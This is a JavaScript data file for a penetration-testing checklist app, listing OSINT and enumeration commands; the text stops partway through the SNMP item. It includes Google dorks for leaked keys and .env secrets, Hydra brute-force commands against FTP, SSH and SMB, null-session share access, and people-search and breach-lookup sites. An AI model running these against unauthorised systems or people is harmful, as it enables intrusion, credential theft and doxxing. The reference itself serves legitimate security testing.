/* ═══════════════════════════════════════════════════════════════════
   Security Tracker – Checklist Data
   ═══════════════════════════════════════════════════════════════════
   EDITING GUIDE
   ─────────────
   Each phase is an object in the `checklistPhases` array below.

   Phase structure:
     {
       id:       "unique_phase_id",         // snake_case, must be unique
       name:     "Display Name",
       optional: true|false,                // optional phases can be toggled off
       items:    [ ...checklist items... ]
     }

   Item structure:
     {
       id:          "phase-N",              // convention: "<phase>-<number>"
       name:        "Item Name",
       description: "What this item checks or does.",
       commands: [                          // array of command groups
         {
           desc:    "Group heading",         // shown above the code block
           subdesc: "Optional subheading",   // smaller text below heading
           cmd: [                            // each string = one line of output
             "command1",
             "command2 --flag"
           ]
         }
       ]
     }

   Notes:
   • `cmd` arrays are joined with newlines at load time (normalizeMultiline).
   • The phase with id "active_directory_exploitation" is only shown
     for Windows machines — no extra config needed.
   • To add a new phase, copy an existing phase object and change its
     id/name/items.  The app picks up changes automatically.
   ═══════════════════════════════════════════════════════════════════ */

/** Join array-of-lines into a single newline-delimited string. */
function normalizeMultiline(value) {
  if (Array.isArray(value)) return value.join('\n');
  return value;
}

/**
 * Walk every phase → item → command entry and collapse
 * any `cmd` arrays into single strings (for <pre> rendering).
 */
function normalizeChecklistPhases(phases) {
  phases.forEach((phase) => {
    (phase.items || []).forEach((item) => {
      item.command = normalizeMultiline(item.command);
      if (Array.isArray(item.commands)) {
        item.commands.forEach((entry) => {
          entry.cmd = normalizeMultiline(entry.cmd);
        });
      }
    });
  });
}

const checklistPhases = [

  /* ─── Phase 1: OSINT ─────────────────────────────────────────── */
  {
    "id": "osint",
    "name": "OSINT",
    "optional": true,
    "items": [
      {
        "id": "osint-1",
        "name": "Google Dorking",
        "description": "Use Google search operators to find exposed files, admin panels, and directory listings.",
        "commands": [
          {
            "desc": "Target Scoping",
            "subdesc": "",
            "cmd": [
              "site:example.com",
              "site:*.example.com",
              "-site:example.com",
              "site:example.com OR site:example.net"
            ]
          },
          {
            "desc": "Logical Operators",
            "subdesc": "",
            "cmd": [
              "example1 AND example2",
              "example1 OR example2",
              "example1 | example2",
              "example1 && example2",
              "(example1 OR example2) AND example3"
            ]
          },
          {
            "desc": "Wildcards & Fuzzing",
            "subdesc": "",
            "cmd": [
              "example*test",
              "example * test",
              "admin*login",
              "password*reset"
            ]
          },
          {
            "desc": "Exact Matching / Ordering",
            "subdesc": "",
            "cmd": [
              "\"example1 example2\"",
              "\"example1 example2 example3\""
            ]
          },
          {
            "desc": "File Type Discovery",
            "subdesc": "",
            "cmd": [
              "filetype:pdf",
              "filetype:doc",
              "filetype:docx",
              "filetype:xls",
              "filetype:xlsx",
              "filetype:csv",
              "filetype:txt",
              "filetype:log",
              "filetype:conf",
              "filetype:cfg",
              "filetype:ini",
              "filetype:sql",
              "filetype:bak",
              "filetype:old",
              "filetype:zip",
              "filetype:rar",
              "filetype:7z",
              "filetype:tar",
              "filetype:gz",
              "filetype:json",
              "filetype:xml",
              "filetype:yml",
              "filetype:yaml",
              "site:example.com filetype:sql"
            ]
          },
          {
            "desc": "URL-Based Discovery",
            "subdesc": "",
            "cmd": [
              "inurl:admin",
              "inurl:login",
              "inurl:signin",
              "inurl:signup",
              "inurl:register",
              "inurl:upload",
              "inurl:download",
              "inurl:backup",
              "inurl:test",
              "inurl:dev",
              "inurl:staging",
              "inurl:old",
              "inurl:api",
              "inurl:v1",
              "inurl:v2",
              "inurl:php?id=",
              "inurl:cmd=",
              "inurl:exec=",
              "inurl:query="
            ]
          },
          {
            "desc": "Page Content Discovery",
            "subdesc": "",
            "cmd": [
              "intext:password",
              "intext:username",
              "intext:credentials",
              "intext:apikey",
              "intext:\"api key\"",
              "intext:\"secret key\"",
              "intext:\"access token\"",
              "intext:\"confidential\"",
              "intext:\"internal use only\""
            ]
          },
          {
            "desc": "Title-Based Discovery",
            "subdesc": "",
            "cmd": [
              "intitle:admin",
              "intitle:login",
              "intitle:dashboard",
              "intitle:index.of",
              "intitle:\"index of\"",
              "intitle:\"parent directory\""
            ]
          },
          {
            "desc": "Directory Listings / Misconfigurations",
            "subdesc": "",
            "cmd": [
              "intitle:\"index of\" \"backup\"",
              "intitle:\"index of\" \".git\"",
              "intitle:\"index of\" \".env\"",
              "intitle:\"index of\" \".ssh\""
            ]
          },
          {
            "desc": "Technology Fingerprinting",
            "subdesc": "",
            "cmd": [
              "inurl:wp-admin",
              "inurl:wp-content",
              "inurl:wp-includes",
              "inurl:phpmyadmin",
              "intitle:phpMyAdmin",
              "inurl:jira",
              "inurl:confluence",
              "inurl:jenkins"
            ]
          },
          {
            "desc": "Credentials & Secrets Leakage",
            "subdesc": "",
            "cmd": [
              "filetype:env \"DB_PASSWORD\"",
              "filetype:env \"AWS_SECRET\"",
              "filetype:env \"API_KEY\"",
              "filetype:json \"access_token\"",
              "filetype:yaml \"password:\"",
              "intext:\"BEGIN RSA PRIVATE KEY\"",
              "intext:\"BEGIN OPENSSH PRIVATE KEY\""
            ]
          },
          {
            "desc": "Cloud & DevOps Artifacts",
            "subdesc": "",
            "cmd": [
              "filetype:tf",
              "filetype:tfvars",
              "filetype:dockerfile",
              "filetype:docker-compose",
              "filetype:helm",
              "filetype:kubeconfig"
            ]
          },
          {
            "desc": "Error & Debug Exposure",
            "subdesc": "",
            "cmd": [
              "intext:\"stack trace\"",
              "intext:\"exception\"",
              "intext:\"fatal error\"",
              "intext:\"debug=true\""
            ]
          },
          {
            "desc": "User-Generated Content / Leaks",
            "subdesc": "",
            "cmd": [
              "site:pastebin.com example.com",
              "site:github.com example.com",
              "site:gitlab.com example.com",
              "site:bitbucket.org example.com",
              "site:stackoverflow.com \"example.com\""
            ]
          },
          {
            "desc": "Authentication & Access Control",
            "subdesc": "",
            "cmd": [
              "inurl:reset",
              "inurl:forgot",
              "inurl:password",
              "intitle:\"two-factor\"",
              "intitle:\"2fa\""
            ]
          },
          {
            "desc": "Historical / Cached Data",
            "subdesc": "",
            "cmd": [
              "cache:example.com",
              "site:web.archive.org example.com"
            ]
          },
          {
            "desc": "Removals / Noise Reduction",
            "subdesc": "",
            "cmd": [
              "-site:facebook.com",
              "-site:twitter.com",
              "-site:linkedin.com",
              "-example -test -sample"
            ]
          },
          {
            "desc": "High-Value Combined Patterns",
            "subdesc": "",
            "cmd": [
              "site:example.com (filetype:env OR filetype:conf)",
              "(inurl:admin OR inurl:login) site:example.com",
              "intitle:\"index of\" (backup OR db OR sql)"
            ]
          }
        ]
      },
      {
        "id": "osint-2",
        "name": "WHOIS Lookup",
        "description": "Identify registration and ownership details for a domain or IP address.",
        "commands": [
          {
            "desc": "Basic Domain Registration",
            "subdesc": "",
            "cmd": [
              "whois target.com"
            ]
          },
          {
            "desc": "Subdomain (may fall back to parent domain)",
            "subdesc": "",
            "cmd": [
              "whois sub.target.com"
            ]
          },
          {
            "desc": "IP Address Registration",
            "subdesc": "",
            "cmd": [
              "whois 10.10.10.5",
              "whois 8.8.8.8"
            ]
          },
          {
            "desc": "CIDR / Netblock Ownership",
            "subdesc": "",
            "cmd": [
              "whois 10.10.10.0/24"
            ]
          },
          {
            "desc": "TLD-Specific WHOIS (bypasses generic resolvers)",
            "subdesc": "",
            "cmd": [
              "whois -h whois.verisign-grs.com target.com",
              "whois -h whois.iana.org target.com"
            ]
          },
          {
            "desc": "Registrar-Specific WHOIS",
            "subdesc": "",
            "cmd": [
              "whois -h whois.godaddy.com target.com",
              "whois -h whois.namecheap.com target.com"
            ]
          },
          {
            "desc": "Nameserver Enumeration",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -i \"name server\"",
              "whois target.com | grep -i \"nserver\""
            ]
          },
          {
            "desc": "Registrar / Organization / Abuse Contacts",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -i \"registrar\"",
              "whois target.com | grep -i \"org\"",
              "whois target.com | grep -i \"abuse\""
            ]
          },
          {
            "desc": "Dates (Attack Surface Timing)",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -i \"creation\"",
              "whois target.com | grep -i \"updated\"",
              "whois target.com | grep -i \"expiry\""
            ]
          },
          {
            "desc": "Reverse WHOIS (email / org reuse indicators)",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -Ei \"email|e-mail|mail\""
            ]
          },
          {
            "desc": "ASN Discovery (pivot to infrastructure scope)",
            "subdesc": "",
            "cmd": [
              "whois 10.10.10.5 | grep -i \"origin\"",
              "whois 10.10.10.5 | grep -i \"asn\""
            ]
          },
          {
            "desc": "RIR-Specific Queries",
            "subdesc": "",
            "cmd": [
              "whois -h whois.arin.net 10.10.10.5",
              "whois -h whois.ripe.net 10.10.10.5",
              "whois -h whois.apnic.net 10.10.10.5",
              "whois -h whois.lacnic.net 10.10.10.5",
              "whois -h whois.afrinic.net 10.10.10.5"
            ]
          },
          {
            "desc": "Organization Netblocks (scope expansion candidate)",
            "subdesc": "",
            "cmd": [
              "whois 10.10.10.5 | grep -i \"netrange\"",
              "whois 10.10.10.5 | grep -i \"cidr\""
            ]
          },
          {
            "desc": "Privacy / Proxy Detection",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -Ei \"privacy|proxy|redacted\""
            ]
          },
          {
            "desc": "Email Infrastructure Clues",
            "subdesc": "",
            "cmd": [
              "whois target.com | grep -Ei \"mx|mail\""
            ]
          }
        ]
      },
      {
        "id": "osint-3",
        "name": "DNS Enumeration",
        "description": "Enumerate DNS records to map infrastructure and find weak points.",
        "commands": [
          {
            "desc": "DNS Banner Grabbing",
            "subdesc": "",
            "cmd": [
              "dig @<TARGET_IP> version.bind CHAOS TXT",
              "nmap -sV -p 53 --script=dns-nsid -Pn <TARGET_IP>"
            ]
          },
          {
            "desc": "DNS Enumeration",
            "subdesc": "",
            "cmd": [
              "whois <DOMAIN_OR_IP>",
              "host <HOSTNAME> <DNS_SERVER>",
              "host -l <DOMAIN> <DNS_SERVER>",
              "dig @<DNS_SERVER> -x <IP_ADDRESS>",
              "dig @<DNS_SERVER> <DOMAIN> <RECORD_TYPE>",
              "dig @ns1.<DOMAIN> <DOMAIN> <RECORD_TYPE>"
            ]
          },
          {
            "desc": "TLS CN → DNS Zone Transfer Check",
            "subdesc": "Nmap shows TLS cert with commonName=mysite.test. DNS service is running — test for misconfigured AXFR.",
            "cmd": [
              "host -T -l <DOMAIN.LOCAL> <TARGET_IP>"
            ]
          },
          {
            "desc": "Post-Zone-Transfer: HTTP Host Enumeration",
            "subdesc": "",
            "cmd": [
              "gobuster dns -r <TARGET_IP> -d <DOMAIN.LOCAL> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
              "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
            ]
          },
          {
            "desc": "DNS Zone Transfer Attacks",
            "subdesc": "",
            "cmd": [
              "dig @<DOMAIN_IP> <DOMAIN> AXFR",
              "dnsrecon -d <DOMAIN> -a"
            ]
          },
          {
            "desc": "DNS Configuration Files (Linux)",
            "subdesc": "",
            "cmd": [
              "/etc/host.conf",
              "/etc/resolv.conf",
              "/etc/named.conf",
              "/etc/bind/named.conf",
              "/etc/bind/named.conf.local"
            ]
          }
        ]
      },
      {
        "id": "osint-4",
        "name": "Subdomain Enumeration",
        "description": "Discover subdomains using passive and active enumeration methods.",
        "commands": [
          {
            "desc": "Passive Subdomain Discovery (Primary)",
            "subdesc": "",
            "cmd": [
              "subfinder -d target.com -silent -o subdomains.txt",
              "subfinder -d target.com -all -recursive -json -o subfinder.json"
            ]
          },
          {
            "desc": "Multi-Source Subdomain Enumeration",
            "subdesc": "",
            "cmd": [
              "amass enum -passive -d target.com -o amass_passive.txt",
              "amass enum -passive -d target.com -src -d target.com -o amass_sources.txt"
            ]
          },
          {
            "desc": "Active Subdomain Enumeration (Escalation)",
            "subdesc": "Use only when allowed by scope.",
            "cmd": [
              "amass enum -active -d target.com -o amass_active.txt",
              "amass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt"
            ]
          }
        ]
      },
      {
        "id": "osint-5",
        "name": "Email Harvesting",
        "description": "Collect email addresses linked to the target domain from all available public sources.",
        "commands": [
          {
            "desc": "Harvest emails and names from all available public sources",
            "subdesc": "",
            "cmd": [
              "theHarvester -d target.com -b all"
            ]
          }
        ]
      },
      {
        "id": "osint-6",
        "name": "Shodan / Censys Recon",
        "description": "Find exposed services, open ports, and banners indexed by Shodan.",
        "commands": [
          {
            "desc": "Search for all services associated with the target domain",
            "subdesc": "",
            "cmd": [
              "shodan search hostname:target.com"
            ]
          },
          {
            "desc": "Inspect all exposed services and banners on a specific IP",
            "subdesc": "",
            "cmd": [
              "shodan host <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "osint-7",
        "name": "Social Media / LinkedIn Recon",
        "description": "Manually gather employee names, job titles, technology stack clues, and org structure from LinkedIn, Twitter, and company pages.",
        "commands": []
      },
      {
        "id": "osint-8",
        "name": "GitHub / Paste Sites",
        "description": "Search GitHub, GitLab, Pastebin, and similar sites for leaked source code, API keys, credentials, or internal references tied to the target.",
        "commands": []
      },
      {
        "id": "osint-9",
        "name": "Automated Scripts",
        "description": "End-to-end OSINT automation scripts that chain multiple tools together.",
        "commands": [
          {
            "desc": "Basic OSINT Recon Script",
            "subdesc": "Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories. Comment out any sections you may not require.",
            "cmd": [
              "#!/bin/bash",
              "",
              "# Use the first argument as the domain name",
              "domain=$1",
              "# Define colors",
              "RED=\"\\033[1;31m\"",
              "RESET=\"\\033[0m\"",
              "",
              "# Define directories",
              "base_dir=\"$domain\"",
              "info_path=\"$base_dir/info\"",
              "subdomain_path=\"$base_dir/subdomains\"",
              "screenshot_path=\"$base_dir/screenshots\"",
              "",
              "# Create directories if they don't exist",
              "for path in \"$info_path\" \"$subdomain_path\" \"$screenshot_path\"; do",
              "    if [ ! -d \"$path\" ]; then",
              "        mkdir -p \"$path\"",
              "        echo \"Created directory: $path\"",
              "    fi",
              "done",
              "",
              "echo -e \"${RED} [+] Checking who it is ... ${RESET}\"",
              "whois \"$domain\" > \"$info_path/whois.txt\"",
              "",
              "echo -e \"${RED} [+] Launching subfinder ... ${RESET}\"",
              "subfinder -d \"$domain\" > \"$subdomain_path/found.txt\"",
              "",
              "echo -e \"${RED} [+] Running assetfinder ... ${RESET}\"",
              "assetfinder \"$domain\" | grep \"$domain\" >> \"$subdomain_path/found.txt\"",
              "",
              "echo -e \"${RED} [+] Checking what\\'s alive ... ${RESET}\"",
              "cat \"$subdomain_path/found.txt\" | grep \"$domain\" | sort -u | httprobe -prefer-https | grep https | sed 's/https\\?:\\/\\///' | tee -a \"$subdomain_path/alive.txt\"",
              "",
              "echo -e \"${RED} [+] Taking screenshots ... ${RESET}\"",
              "gowitness file -f \"$subdomain_path/alive.txt\" -P \"$screenshot_path/\" --no-http"
            ]
          }
        ]
      },
      {
        "id": "osint-10",
        "name": "OSINT Reconnaissance: People",
        "description": "Search for people, phone numbers, and voter registration records using public lookup services.",
        "commands": [
          {
            "desc": "People Search Engines",
            "subdesc": "",
            "cmd": [
              "https://www.whitepages.com/",
              "https://www.truepeoplesearch.com/",
              "https://www.fastpeoplesearch.com/",
              "https://www.fastbackgroundcheck.com/",
              "https://webmii.com/",
              "https://peekyou.com/",
              "https://www.411.com/",
              "https://www.spokeo.com/",
              "https://thatsthem.com/"
            ]
          },
          {
            "desc": "Voter Registration Records",
            "subdesc": "",
            "cmd": [
              "https://voterrecords.com/"
            ]
          },
          {
            "desc": "Phone Number Lookup",
            "subdesc": "",
            "cmd": [
              "https://www.truecaller.com/",
              "https://calleridtest.com/",
              "https://infobel.com/"
            ]
          }
        ]
      },
      {
        "id": "osint-11",
        "name": "OSINT Reconnaissance: Email",
        "description": "Discover, verify, and harvest email addresses tied to a target domain.",
        "commands": [
          {
            "desc": "Email Discovery & Harvesting",
            "subdesc": "",
            "cmd": [
              "https://hunter.io/",
              "https://phonebook.cz/",
              "https://www.voilanorbert.com/"
            ]
          },
          {
            "desc": "Email Verification",
            "subdesc": "",
            "cmd": [
              "https://tools.verifyemailaddress.io/",
              "https://email-checker.net/validate"
            ]
          },
          {
            "desc": "Harvest emails from all public sources",
            "subdesc": "",
            "cmd": [
              "theHarvester -d target.com -b all"
            ]
          }
        ]
      },
      {
        "id": "osint-12",
        "name": "OSINT Reconnaissance: Usernames & Passwords",
        "description": "Check for credential leaks, enumerate usernames across platforms, and identify reused accounts.",
        "commands": [
          {
            "desc": "Password Breach Databases",
            "subdesc": "",
            "cmd": [
              "https://haveibeenpwned.com/",
              "https://weleakinfo.to/v2/",
              "https://leakcheck.io/",
              "https://snusbase.com/",
              "https://scylla.sh/"
            ]
          },
          {
            "desc": "Username Enumeration (Online)",
            "subdesc": "",
            "cmd": [
              "https://namechk.com/",
              "https://whatsmyname.app/",
              "https://namecheckup.com/"
            ]
          },
          {
            "desc": "Username Enumeration (Sherlock)",
            "subdesc": "Sherlock searches 400+ social networks for matching usernames.",
            "cmd": [
              "sherlock <USERNAME>",
              "sherlock <USERNAME> --output results.txt",
              "sherlock <USERNAME> --print-found",
              "sherlock <USER1> <USER2> <USER3>"
            ]
          }
        ]
      },
      {
        "id": "osint-13",
        "name": "OSINT Reconnaissance: Social Media",
        "description": "Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, and TikTok.",
        "commands": [
          {
            "desc": "Twitter / X",
            "subdesc": "",
            "cmd": [
              "https://twitter.com/search-advanced",
              "https://github.com/rmdir-rp/OSINT-twitter-tools"
            ]
          },
          {
            "desc": "Instagram",
            "subdesc": "",
            "cmd": [
              "https://imginn.com/"
            ]
          },
          {
            "desc": "Snapchat",
            "subdesc": "",
            "cmd": [
              "https://map.snapchat.com/"
            ]
          }
        ]
      },
      {
        "id": "osint-14",
        "name": "OSINT Reconnaissance: Images",
        "description": "Reverse image search and EXIF metadata extraction for location and device intelligence.",
        "commands": [
          {
            "desc": "Reverse Image Search",
            "subdesc": "Most useful for identifying locations from background context like buildings, signs, and landmarks.",
            "cmd": [
              "https://images.google.com/",
              "https://tineye.com/",
              "https://yandex.com/images/"
            ]
          },
          {
            "desc": "EXIF Metadata Extraction",
            "subdesc": "Social media platforms strip EXIF data on upload, but direct file transfers and some websites preserve it.",
            "cmd": [
              "exiftool <IMAGE_FILE>",
              "exiftool -gps* <IMAGE_FILE>",
              "https://jimpl.com/"
            ]
          }
        ]
      },
      {
        "id": "osint-15",
        "name": "OSINT Reconnaissance: Websites",
        "description": "Fingerprint web technologies, analyze DNS records, scan for threats, and monitor website changes.",
        "commands": [
          {
            "desc": "Technology Fingerprinting & DNS",
            "subdesc": "",
            "cmd": [
              "https://builtwith.com/",
              "https://centralops.net/co/",
              "https://dnslytics.com/reverse-ip",
              "https://spyonweb.com/",
              "https://viewdns.info/"
            ]
          },
          {
            "desc": "Threat Intelligence & Scanning",
            "subdesc": "",
            "cmd": [
              "https://www.virustotal.com/",
              "https://urlscan.io/",
              "https://web-check.as93.net/"
            ]
          },
          {
            "desc": "DNS & Certificate Transparency",
            "subdesc": "",
            "cmd": [
              "https://dnsdumpster.com/",
              "https://crt.sh/"
            ]
          },
          {
            "desc": "Infrastructure Discovery",
            "subdesc": "",
            "cmd": [
              "https://shodan.io/",
              "shodan search hostname:target.com",
              "shodan host <TARGET_IP>"
            ]
          },
          {
            "desc": "Website Monitoring & Historical Data",
            "subdesc": "",
            "cmd": [
              "https://visualping.io/",
              "http://backlinkwatch.com/index.php",
              "https://web.archive.org/"
            ]
          }
        ]
      },
      {
        "id": "osint-16",
        "name": "OSINT Reconnaissance: Business",
        "description": "Investigate corporate registrations, organizational structure, and business intelligence.",
        "commands": [
          {
            "desc": "Corporate Registry & Business Intelligence",
            "subdesc": "",
            "cmd": [
              "https://opencorporates.com/",
              "https://www.aihitdata.com/"
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 2: Enumeration / Recon ────────────────────────────── */
  {
    "id": "recon",
    "name": "Enumeration",
    "optional": false,
    "items": [
      {
        "id": "recon-2",
        "name": "TCP Port Scan (Full)",
        "description": "Full TCP port coverage with OS detection and aggressive scan settings.",
        "commands": [
          {
            "desc": "Full TCP scan with OS and version detection at high speed",
            "subdesc": "",
            "cmd": [
              "nmap -p- -O -sC -sV -A --min-rate 5000 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-3",
        "name": "UDP Port Scan",
        "description": "Scan the most common UDP services for exposure.",
        "commands": [
          {
            "desc": "Scan top 100 UDP ports",
            "subdesc": "",
            "cmd": [
              "nmap -sU --top-ports 100 <TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-4",
        "name": "FTP Enumeration (21)",
        "description": "Check for anonymous access, grab files, and bruteforce credentials.",
        "commands": [
          {
            "desc": "Attempt anonymous FTP login (use \"passive\" if 229 error)",
            "subdesc": "",
            "cmd": [
              "ftp anonymous@<TARGET_IP>"
            ]
          },
          {
            "desc": "Grab all files from an anonymous share",
            "subdesc": "",
            "cmd": [
              "binary",
              "PROMPT OFF",
              "mget *"
            ]
          },
          {
            "desc": "Bruteforce FTP credentials with Hydra",
            "subdesc": "-s <port-num> specify non-default port | -f exit after first valid login | -u try each username with all passwords before moving on",
            "cmd": [
              "hydra -v -L users.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TARGET_IP> -t 4"
            ]
          }
        ]
      },
      {
        "id": "recon-5",
        "name": "SSH Enumeration (22)",
        "description": "Audit SSH config, grab banners, and bruteforce credentials.",
        "commands": [
          {
            "desc": "Audit SSH server configuration and supported ciphers",
            "subdesc": "",
            "cmd": [
              "ssh-audit <TARGET_IP>"
            ]
          },
          {
            "desc": "Grab SSH banner using legacy key exchange",
            "subdesc": "",
            "cmd": [
              "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET_IP>"
            ]
          },
          {
            "desc": "Bruteforce SSH credentials with Hydra",
            "subdesc": "-f exit after first valid login | -u try each username with all passwords before moving on",
            "cmd": [
              "hydra -L users.txt -P passwords.txt -t 6 -vV ssh://<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-6",
        "name": "SMTP Enumeration (25/465/587)",
        "description": "Enumerate mail users, verify addresses manually, and send phishing test emails.",
        "commands": [
          {
            "desc": "Enumerate SMTP users with nmap script",
            "subdesc": "",
            "cmd": [
              "nmap -p 25 --script=smtp-enum-users <TARGET_IP>"
            ]
          },
          {
            "desc": "Manually verify an email address via VRFY",
            "subdesc": "",
            "cmd": [
              "nc -nv <TARGET_IP> 25",
              "VRFY <username>"
            ]
          },
          {
            "desc": "Send a phishing test email with attachment (SWAKS)",
            "subdesc": "",
            "cmd": [
              "swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test \"Header\" --server <TARGET_IP> --attach file.txt"
            ]
          }
        ]
      },
      {
        "id": "recon-7",
        "name": "DNS Enumeration (53)",
        "description": "Banner grabbing, DNS enumeration, zone transfer testing, and subdomain discovery.",
        "commands": [
          {
            "desc": "Banner grabbing and DNS version info",
            "subdesc": "",
            "cmd": [
              "dig @<TARGET_IP> version.bind CHAOS TXT",
              "nmap -sV --script dns-nsid -p53 -Pn <TARGET_IP>"
            ]
          },
          {
            "desc": "DNS record enumeration (whois, host, dig)",
            "subdesc": "",
            "cmd": [
              "whois <DOMAIN>",
              "host <DOMAIN> <TARGET_IP>",
              "host -l <DOMAIN> <TARGET_IP>",
              "dig @<TARGET_IP> -x <TARGET_IP>",
              "dig @<TARGET_IP> <DOMAIN> ANY"
            ]
          },
          {
            "desc": "Zone transfer test",
            "subdesc": "",
            "cmd": [
              "host -T -l <DOMAIN> <TARGET_IP>",
              "dig @<TARGET_IP> <DOMAIN> AXFR",
              "dnsrecon -d <DOMAIN> -a"
            ]
          },
          {
            "desc": "Subdomain enumeration (gobuster and ffuf)",
            "subdesc": "",
            "cmd": [
              "gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100",
              "ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H \"Host: FUZZ.<RHOST>\" -fs 185"
            ]
          }
        ]
      },
      {
        "id": "recon-8",
        "name": "HTTP Enumeration (80/443)",
        "description": "Web server fingerprinting, header inspection, technology enumeration, and default credential checks. Also manually review page source, robots.txt, sitemap.xml, and any login/upload portals.",
        "commands": [
          {
            "desc": "Fingerprint web server with nmap http-enum",
            "subdesc": "",
            "cmd": [
              "nmap -p 80 -sV --script=http-enum <TARGET_IP>"
            ]
          },
          {
            "desc": "Grab HTTP headers and follow redirects",
            "subdesc": "",
            "cmd": [
              "curl -IL http://<TARGET_IP>"
            ]
          },
          {
            "desc": "Technology fingerprinting with WhatWeb",
            "subdesc": "",
            "cmd": [
              "whatweb -a 3 http://<TARGET_IP>",
              "whatweb --no-errors <TARGET_SUBNET>/24"
            ]
          }
        ]
      },
      {
        "id": "recon-9",
        "name": "Directory Busting (HTTP)",
        "description": "Directory and file fuzzing on the web server.",
        "commands": [
          {
            "desc": "FEROXBUSTER",
            "subdesc": "Start with a basic directory scan, excluding certain HTTP error codes:",
            "cmd": [
              "feroxbuster -u http://<TARGET-HOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 400,402,404,500,501,502,503,504,505"
            ]
          },
          {
            "desc": "GOBUSTER",
            "subdesc": "Proceed with using raft-large-directories.txt dictionary:",
            "cmd": [
              "gobuster dir -u http://<TARGET-HOST> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -t 5 -b 404,501,502,503,504,505"
            ]
          },
          {
            "desc": "FFUF",
            "subdesc": "Continue with raft dictionary, but this time with all relevant extensions:",
            "cmd": [
              "ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.html,.asp,.aspx,.bak,.old,.orig,.tmp,.txt,.log,.env,.xml,.json,.yml,.conf,.ini,.zip,.tar,.gz,.rar,.md,.jsp,.sqp,.swo -r -t 100 -mc 200,301,302 -c\""
            ]
          },
          {
            "desc": "DIRSEARCH",
            "subdesc": "Use common.txt dictionary:",
            "cmd": [
              "dirsearch -u \"SITE-PATH\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 --exclude-status 400,401,403,404,503"
            ]
          }
        ]
      },
      {
        "id": "recon-10",
        "name": "Nikto Scan (HTTP)",
        "description": "Web misconfiguration and vulnerability scan.",
        "commands": [
          {
            "desc": "Run a full Nikto scan and save output",
            "subdesc": "",
            "cmd": [
              "nikto -h http://<TARGET_IP> -o nikto_output.txt"
            ]
          }
        ]
      },
      {
        "id": "recon-11",
        "name": "SMB Enumeration (139/445)",
        "description": "Anonymous access, null sessions, share enumeration, SMB login with password/hash, and bruteforce.",
        "commands": [
          {
            "desc": "Anonymous and null session login attempts",
            "subdesc": "",
            "cmd": [
              "smbclient -L //<TARGET_IP> -U anonymous",
              "smbclient -N -L //<TARGET_IP>",
              "smbclient -N //<TARGET_IP>/<SHARE>"
            ]
          },
          {
            "desc": "CrackMapExec enumeration (users, password policy, shares)",
            "subdesc": "",
            "cmd": [
              "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --users --rid-brute",
              "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --pass-pol",
              "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --shares",
              "crackmapexec smb <TARGET_IP> -u \"\" -p \"\" --spider <SHARE> --regex ."
            ]
          },
          {
            "desc": "Enum4Linux and nmap SMB scripts",
            "subdesc": "",
            "cmd": [
              "enum4linux -a <TARGET_IP>",
              "nmap -v -p 139,445 --script smb-os-discovery <TARGET_IP>",
              "nmap --script smb-vuln* -p 139,445 <TARGET_IP>"
            ]
          },
          {
            "desc": "Authenticated SMB login (password and NTLM hash)",
            "subdesc": "Inside smbclient: RECURSE ON / PROMPT OFF / mget *",
            "cmd": [
              "smbclient //<TARGET_IP>/SYSVOL -U <USER>",
              "smbclient -p 445 //<TARGET_IP>/<SHARE> -U <USER> --password=<PASS>",
              "smbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>"
            ]
          },
          {
            "desc": "Bruteforce SMB credentials with Hydra",
            "subdesc": "",
            "cmd": [
              "hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET_IP>"
            ]
          }
        ]
      },
      {
        "id": "recon-12",
        "name": "SNMP Enumeration (161)",
        "description": "Scan for SNMP, bruteforce community strings, and enumerate Windows users/processes/software via MIB OIDs.",
        "commands": [
          {
            "desc": "Scan subnet for open SNMP ports",
            "subdesc": "",
            "cmd": [
              "nmap -sU --open -p 161 <TARGET_SUBNET> -oG open-snmp.txt"
            ]
          },
          {
            "desc": "Bruteforce SNMP community strings",
            "subdesc": "",
            "cmd": [
              "onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>"
            ]
          },
          {
            "desc": "SNMP walk with public community string",
            "subdesc": "",
            "cmd": [
              "snmpwalk -c public -v1 -t 10 <TARGET_IP>"
            ]
          },
          {
            "desc": "Enumerate Windows users, processes, software, and open ports via MIB OIDs",
            "subdesc": "Windows Users → .77.1.2.25 | Running Processes → .25.4.2.1.2 | Installed Software → .25.6.3.1.2 | TCP Listening Ports → .6.13.1.3",
            "cmd": [
              "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
              "snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
